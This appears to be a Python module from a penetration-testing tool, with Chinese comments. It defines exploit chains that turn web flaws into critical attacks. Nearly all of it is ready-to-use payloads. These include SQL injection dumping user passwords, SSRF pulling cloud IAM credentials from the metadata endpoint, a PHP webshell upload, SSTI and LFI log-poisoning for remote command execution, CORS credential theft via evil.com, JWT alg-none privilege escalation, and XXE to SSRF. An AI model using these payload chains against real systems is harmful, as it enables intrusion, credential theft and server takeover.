"""
漏洞链引擎

将低危漏洞组合成高危利用链。
"""

from dataclasses import dataclass
from typing import List, Dict


@dataclass
class VulnChainStep:
    """漏洞链步骤"""
    vuln_type: str
    description: str
    payload: str
    expected_result: str
    tools_required: List[str]


@dataclass
class VulnChain:
    """漏洞链"""
    name: str
    display_name: str
    description: str
    severity: str
    cvss_score: float
    steps: List[VulnChainStep]
    prerequisites: List[str]


VULN_CHAINS: Dict[str, VulnChain] = {
    # SQL 注入数据泄露
    "sqli-data-leak": VulnChain(
        name="sqli-data-leak",
        display_name="SQL Injection Data Leak",
        description="通过 SQL 注入获取数据库敏感数据",
        severity="critical",
        cvss_score=9.8,
        steps=[
            VulnChainStep(
                vuln_type="sqli",
                description="检测 SQL 注入点",
                payload="' OR 1=1--",
                expected_result="返回数据或页面变化",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="sqli",
                description="获取数据库信息",
                payload="' UNION SELECT database(),version()--",
                expected_result="返回数据库名和版本",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="sqli",
                description="获取表名",
                payload="' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()--",
                expected_result="返回表名列表",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="sqli",
                description="获取敏感数据",
                payload="' UNION SELECT username,password FROM users LIMIT 5--",
                expected_result="返回用户名和密码",
                tools_required=["inject"],
            ),
        ],
        prerequisites=["sqli-vuln"],
    ),

    # SSRF 云凭据泄露
    "ssrf-cloud-creds": VulnChain(
        name="ssrf-cloud-creds",
        display_name="SSRF Cloud Credentials Leak",
        description="通过 SSRF 获取云元数据凭据",
        severity="critical",
        cvss_score=9.0,
        steps=[
            VulnChainStep(
                vuln_type="ssrf",
                description="检测 SSRF 漏洞",
                payload="http://your-dnslog.com/",
                expected_result="收到 DNS 回调",
                tools_required=["inject", "oob"],
            ),
            VulnChainStep(
                vuln_type="ssrf",
                description="访问云元数据",
                payload="http://169.254.169.254/latest/meta-data/",
                expected_result="返回元数据",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="ssrf",
                description="获取 IAM 凭据",
                payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                expected_result="返回 IAM 角色名",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="ssrf",
                description="获取临时凭据",
                payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
                expected_result="返回 AccessKeyId, SecretAccessKey, Token",
                tools_required=["inject"],
            ),
        ],
        prerequisites=["ssrf-vuln"],
    ),

    # 文件上传 RCE
    "upload-rce": VulnChain(
        name="upload-rce",
        display_name="File Upload to RCE",
        description="通过文件上传获取远程命令执行",
        severity="critical",
        cvss_score=9.8,
        steps=[
            VulnChainStep(
                vuln_type="upload",
                description="检测文件上传功能",
                payload="test.php",
                expected_result="上传成功或返回错误信息",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="upload",
                description="绕过文件类型检查",
                payload="test.php.jpg",
                expected_result="上传成功",
                tools_required=["inject", "fuzz"],
            ),
            VulnChainStep(
                vuln_type="upload",
                description="上传 Webshell",
                payload="<?php system($_GET['cmd']);?>",
                expected_result="上传成功",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="rce",
                description="执行命令",
                payload="http://target.com/uploads/shell.php?cmd=id",
                expected_result="返回命令执行结果",
                tools_required=["inject"],
            ),
        ],
        prerequisites=["upload-vuln"],
    ),

    # CORS 账户接管
    "cors-account-takeover": VulnChain(
        name="cors-account-takeover",
        display_name="CORS Account Takeover",
        description="通过 CORS 配置错误窃取用户凭据",
        severity="high",
        cvss_score=7.5,
        steps=[
            VulnChainStep(
                vuln_type="cors",
                description="检测 CORS 配置错误",
                payload="Origin: https://evil.com",
                expected_result="响应头包含 Access-Control-Allow-Origin: https://evil.com",
                tools_required=["passive_scan"],
            ),
            VulnChainStep(
                vuln_type="cors",
                description="验证凭据泄露",
                payload="fetch('https://target.com/api/user', {credentials: 'include'}).then(r => r.text())",
                expected_result="返回用户信息",
                tools_required=["inject"],
            ),
        ],
        prerequisites=["cors-vuln"],
    ),

    # IDOR 数据泄露
    "idor-data-leak": VulnChain(
        name="idor-data-leak",
        display_name="IDOR Data Leak",
        description="通过 IDOR 访问其他用户数据",
        severity="high",
        cvss_score=7.5,
        steps=[
            VulnChainStep(
                vuln_type="idor",
                description="检测 IDOR 漏洞",
                payload="GET /api/user/123 → GET /api/user/124",
                expected_result="返回其他用户数据",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="idor",
                description="批量获取数据",
                payload="遍历 ID 1-100",
                expected_result="返回多个用户数据",
                tools_required=["inject"],
            ),
        ],
        prerequisites=["idor-vuln"],
    ),

    # SSTI RCE
    "ssti-rce": VulnChain(
        name="ssti-rce",
        display_name="SSTI to RCE",
        description="通过 SSTI 获取远程命令执行",
        severity="critical",
        cvss_score=9.8,
        steps=[
            VulnChainStep(
                vuln_type="ssti",
                description="检测 SSTI 漏洞",
                payload="{{7*7}}",
                expected_result="返回 49",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="ssti",
                description="执行命令",
                payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                expected_result="返回命令执行结果",
                tools_required=["inject"],
            ),
        ],
        prerequisites=["ssti-vuln"],
    ),

    # LFI RCE
    "lfi-rce": VulnChain(
        name="lfi-rce",
        display_name="LFI to RCE",
        description="通过 LFI 日志包含获取命令执行",
        severity="critical",
        cvss_score=9.0,
        steps=[
            VulnChainStep(
                vuln_type="lfi",
                description="检测 LFI 漏洞",
                payload="../../../../etc/passwd",
                expected_result="返回 /etc/passwd 内容",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="lfi",
                description="写入日志",
                payload="User-Agent: <?php system($_GET['cmd']);?>",
                expected_result="写入成功",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="lfi",
                description="包含日志执行命令",
                payload="../../../../var/log/apache2/access.log&cmd=id",
                expected_result="返回命令执行结果",
                tools_required=["inject"],
            ),
        ],
        prerequisites=["lfi-vuln"],
    ),

    # JWT 权限提升
    "jwt-privilege-escalation": VulnChain(
        name="jwt-privilege-escalation",
        display_name="JWT Privilege Escalation",
        description="通过 JWT 漏洞提升权限",
        severity="high",
        cvss_score=8.0,
        steps=[
            VulnChainStep(
                vuln_type="jwt",
                description="检测 JWT 漏洞",
                payload="修改 alg 为 None",
                expected_result="Token 仍然有效",
                tools_required=["api_test"],
            ),
            VulnChainStep(
                vuln_type="jwt",
                description="修改用户角色",
                payload="修改 payload 中的 role 为 admin",
                expected_result="获得管理员权限",
                tools_required=["api_test"],
            ),
        ],
        prerequisites=["jwt-vuln"],
    ),

    # 反序列化 RCE
    "deser-rce": VulnChain(
        name="deser-rce",
        display_name="Deserialization to RCE",
        description="通过反序列化漏洞执行命令",
        severity="critical",
        cvss_score=9.8,
        steps=[
            VulnChainStep(
                vuln_type="deser",
                description="检测反序列化漏洞",
                payload="O:3:\"Foo\":1:{s:3:\"cmd\";s:2:\"id\";}",
                expected_result="返回命令执行结果",
                tools_required=["inject"],
            ),
            VulnChainStep(
                vuln_type="deser",
                description="执行命令",
                payload="构造恶意序列化数据",
                expected_result="返回命令执行结果",
                tools_required=["inject"],
            ),
        ],
        prerequisites=["deser-vuln"],
    ),

    # XXE SSRF
    "xxe-ssrf": VulnChain(
        name="xxe-ssrf",
        display_name="XXE to SSRF",
        description="通过 XXE 发起 SSRF 攻击",
        severity="high",
        cvss_score=7.5,
        steps=[
            VulnChainStep(
                vuln_type="xxe",
                description="检测 XXE 漏洞",
                payload="<!ENTITY xxe SYSTEM \"http://your-dnslog.com/\">",
                expected_result="收到 DNS 回调",
                tools_required=["inject", "oob"],
            ),
            VulnChainStep(
                vuln_type="xxe",
                description="访问内部资源",
                payload="<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">",
                expected_result="返回元数据",
                tools_required=["inject"],
            ),
        ],
        prerequisites=["xxe-vuln"],
    ),
}
